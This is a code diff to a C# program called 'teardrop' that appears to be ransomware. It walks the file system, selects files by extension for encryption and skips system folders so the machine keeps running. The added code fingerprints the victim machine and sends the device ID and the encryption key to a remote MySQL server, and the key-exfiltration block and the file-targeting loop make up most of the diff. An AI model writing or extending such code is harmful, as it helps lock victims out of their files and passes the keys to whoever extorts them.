@@ -1,4 +1,6 @@
-﻿using System;
+﻿using DeviceId;
+using MySql.Data.MySqlClient;
+using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
@@ -34,6 +36,52 @@ namespace teardrop
             else
             {
                 write("Key is: " + Properties.Settings.Default.key);
+            }
+
+            string deviceId = new DeviceIdBuilder()
+                .AddMachineName()
+                .AddProcessorId()
+                .AddMotherboardSerialNumber()
+                .AddSystemDriveSerialNumber()
+                .ToString();
+
+            string myConnectionString = "SERVER=" + Properties.Settings.Default.db_host + ";" +
+                            "DATABASE=" + Properties.Settings.Default.db_database + ";" +
+                            "UID=" + Properties.Settings.Default.db_user + ";" +
+                            "PASSWORD=" + Properties.Settings.Default.db_pass + ";";
+
+
+
+            if(Properties.Settings.Default.db_enable == true)
+            {
+                try
+                {
+                    MySqlConnection connection = new MySqlConnection(myConnectionString);
+                    MySqlCommand command = connection.CreateCommand();
+                    command.CommandText = "INSERT INTO machine (deviceID,pass) VALUES ('" + deviceId + "', '" + Properties.Settings.Default.key + "')";
+                    MySqlDataReader Reader;
+                    connection.Open();
+                    Reader = command.ExecuteReader();
+                    while (Reader.Read())
+                    {
+                        string row = "";
+                        for (int i = 0; i < Reader.FieldCount; i++)
+                            row += Reader.GetValue(i).ToString() + ", ";
+                        Console.WriteLine(row);
+                    }
+                    connection.Close();
+                }
+                catch (Exception ex)
+                {
+                    if (ex.Message.Contains("DUPLICATE"))
+                    {
+
+                    }
+                    else
+                    {
+                        MessageBox.Show(ex.Message);
+                    }
+                }
             }
 
 
@@ -76,7 +124,12 @@ namespace teardrop
                                 ".asp", ".aspx", ".css", ".js", ".py", ".sh", ".vb", "java", ".cpp"
                             };
 
-                            if (validExtensions.Contains(ext))
+                            var skipPath = new[]
+                            {
+                                "System32", "WinSxS", "Program Files"
+                            };
+
+                            if (validExtensions.Contains(ext) && !skipPath.Contains(s))
                             {
                                 //Crypto.FileEncrypt(s, Properties.Settings.Default.key);
                                 write("Encrypted " + s);
@@ -89,6 +142,7 @@ namespace teardrop
                 }
             }
             catch (UnauthorizedAccessException e) { write(e.Message); }
+            
         }
 
         public void GetFiles()
@@ -119,7 +173,8 @@ namespace teardrop
             {
 
             }
-        
+
+            write("Done getting stuff :)");
         }
     }
 }
